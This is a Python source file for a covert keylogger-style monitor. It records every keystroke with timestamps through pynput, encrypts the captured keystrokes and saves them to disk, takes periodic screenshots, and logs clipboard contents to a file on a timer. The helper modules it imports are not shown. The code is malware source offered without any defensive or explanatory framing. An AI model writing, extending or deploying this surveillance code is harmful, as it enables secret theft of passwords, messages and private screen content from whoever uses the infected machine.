
import os
import threading
from utils.encryption import encrypt_log, save_encrypted_log
from utils.screenshot import capture_screenshot
from utils.clipboard import get_clipboard_data
from pynput import keyboard
from datetime import datetime

LOG_FILE = "logs/log.txt"
SCREENSHOT_INTERVAL = 60  # seconds
CLIPBOARD_INTERVAL = 30  # seconds

log_data = ""

def on_press(key):
    global log_data
    try:
        log_data += f"{datetime.now()} - {key.char}\n"
    except AttributeError:
        log_data += f"{datetime.now()} - {key}\n"
    if len(log_data) > 100:
        encrypted = encrypt_log(log_data)
        save_encrypted_log(encrypted)
        log_data = ""

def screenshot_loop():
    while True:
        capture_screenshot()
        time.sleep(SCREENSHOT_INTERVAL)

def clipboard_loop():
    while True:
        clip_data = get_clipboard_data()
        with open("logs/clipboard.txt", "a") as f:
            f.write(f"{datetime.now()} - {clip_data}\n")
        time.sleep(CLIPBOARD_INTERVAL)

if __name__ == "__main__":
    import time
    os.makedirs("logs", exist_ok=True)
    threading.Thread(target=screenshot_loop, daemon=True).start()
    threading.Thread(target=clipboard_loop, daemon=True).start()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
